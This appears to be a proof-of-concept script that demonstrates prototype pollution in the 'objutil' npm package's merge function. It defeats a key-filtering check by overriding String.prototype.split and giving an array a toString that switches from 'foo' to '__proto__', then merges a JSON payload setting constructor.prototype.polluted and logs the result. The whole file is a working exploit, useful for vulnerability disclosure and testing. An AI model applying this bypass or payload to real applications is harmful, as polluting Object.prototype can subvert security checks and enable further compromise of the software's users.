var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const {merge, remove} = require('objutil');
let a = {
    x: 1,
    y: {
        w: 1,
        z: 2
    }
};
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
result = merge(a, JSON.parse(malicious_payload));
console.log({}.polluted);